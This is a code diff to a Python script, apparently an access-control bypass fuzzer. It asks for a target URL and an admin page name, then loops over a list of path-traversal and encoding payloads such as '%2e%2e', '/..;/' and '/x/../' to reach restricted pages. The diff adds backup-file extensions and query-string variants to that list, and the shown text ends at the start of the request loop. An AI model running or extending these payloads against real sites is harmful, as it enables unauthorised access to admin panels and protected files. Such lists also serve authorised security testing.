@@ -1,4 +1,5 @@
 import requests,sys,colorama,concurrent.futures,time
+colorama.init()
 def spped():
 	print('''
 		this script for check restriced and misconfiguration access for files\n
@@ -7,7 +8,7 @@ def spped():
 		''')
 	url =input("Enter your url ex:http://www.site.com/ ")
 	page=input("Enter ur page|diractory ex: admin or adminpanel ")
-	i=[";","/%5C","///","%2e%2e","//","%2f%2e%2e","/%5c/","%2f..","/;","/baz/%2e%2e/"+page,"~","/..;/",".","..","...","...."+page,"/."+page,"/.."+page,"/..."+page,"/...."+page,"/x/../"+page,"/x/./"+page,"/x/../../"+page,"/x/././"+page]
+	i=["/../~"+page,".json",".bak",".xml",".zip",".tar",".txt","?%s"%page,";","/%5C","///","%2e%2e","//","%2f%2e%2e","/%5c/","%2f..","/;","/baz/%2e%2e/"+page,"~","/..;/",".","..","...","...."+page,"/."+page,"/.."+page,"/..."+page,"/...."+page,"/x/../"+page,"/x/./"+page,"/x/../../"+page,"/x/././"+page]
 	for bypass in i:
 		bypass=bypass
 		try:
